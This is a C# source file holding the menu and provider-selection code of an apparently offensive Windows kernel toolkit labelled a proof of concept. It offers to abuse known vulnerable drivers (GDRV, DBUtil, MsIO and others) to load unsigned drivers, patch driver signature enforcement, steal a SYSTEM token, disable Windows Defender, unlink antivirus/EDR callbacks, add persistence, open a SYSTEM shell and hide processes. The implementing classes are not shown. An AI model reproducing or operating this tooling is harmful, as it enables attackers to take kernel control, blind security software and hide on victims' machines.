using KernelMode.Defender;
using KernelMode.Driver;
using KernelMode.Privilege;
using KernelMode.Providers;
using KernelMode.Utils;
using System;

namespace KernelMode
{
	internal static class PoCMenu
	{
		private static IProvider _provider;
		public static void Run()
		{

			_provider = KernelMemory.IsReady ? KernelMemory.GetProvider() : null;
			_provider = SelectProvider();
			if (_provider == null)
			{
				Console.WriteLine("[-] Provider setup failed. Press any key to exit.");
				Console.ReadKey();
				return;
			}
			while (true)
			{
				//Console.Clear();
				Console.WriteLine("=== KernelMode PoC Menu ===");
				Console.WriteLine("[1] Load unsigned driver (.bin)");
				Console.WriteLine("[2] Elevate to SYSTEM (token steal)");
				Console.WriteLine("[3] Disable Windows Defender");
				Console.WriteLine("[4] Force-unload AV/EDR driver");
				Console.WriteLine("[5] Add persistence");
				Console.WriteLine("[6] Remove persistence");
				Console.WriteLine("[7] Interactive SYSTEM Shell");
				Console.WriteLine("[8] Load unsigned driver (.sys) via DSE Patch");
				Console.WriteLine("[9] Test PE Parsing (dry-run)");
				Console.WriteLine("[10] Hide Process (DKOM)");
				Console.WriteLine("[0] Exit");
				Console.Write("Select an option: ");

				switch (Console.ReadLine())
				{
					case "1":
						DriverLoader.LoadMappedBin();
						break;
					case "2":
						TokenManipulator.StealSystemToken();
						break;
					case "3":
						if (_provider != null)
							DefenderDisabler.Disable(_provider);
						else
							Console.WriteLine("[-] Provider not initialized.");
						break;
					case "4":
						AvCallbackUnlinker.UnlinkAVCallbacks();
						break;
					case "5":
						//Persistence.Add();
						break;
					case "6":
						Persistence.Remove();
						break;
					case "7":
						SystemShell.Start();
						break;
					case "8":
						DriverLoader.LoadUnsignedDriver();
						break;
					case "9":
						DriverLoader.TestPEParsingDryRun();
						break;
					case "10":
						Console.Write("Enter PID of process to hide: ");
						if (int.TryParse(Console.ReadLine(), out int pidToHide))
						{
							ProcessHider.HideProcess(pidToHide);
						}
						else
						{
							Console.WriteLine("[-] Invalid PID.");
						}
						break;
					case "0":
						return;
					default:
						Console.WriteLine("Invalid selection.");
						break;
				}

				Console.WriteLine("[*] Press any key to continue...");
				Console.ReadKey();
			}

		}
		private static IProvider SelectProvider()
		{
			Console.WriteLine("=== Select Vulnerable Driver Provider ===");
			Console.WriteLine("[1] GDRV");
			Console.WriteLine("[2] DBUtil");
			Console.WriteLine("[3] NeacSafe64");
			Console.WriteLine("[4] MsIO");
			Console.WriteLine("[5] PdfwKrnl");
			Console.Write("Choice: ");
			string choice = Console.ReadLine();

			IProvider provider = null;
			switch (choice)
			{
				case "1": provider = new GdrvProvider(); break;
				case "2": provider = new DBUtilProvider(); break;
				case "3": provider = new NeacSafeProvider(); break;
				case "4": provider = new MsioProvider(); break;
				case "5": provider = new PdfwProvider(); break;
				default:
					Console.WriteLine("[-] Invalid provider.");
					return null;
			}

			if (!provider.Initialize())
			{
				Console.WriteLine("[-] Failed to initialize provider.");
				return null;
			}

			KernelMemory.SetProvider(provider);
			Console.WriteLine("[+] Provider initialized.");
			return provider;
		}
	}
}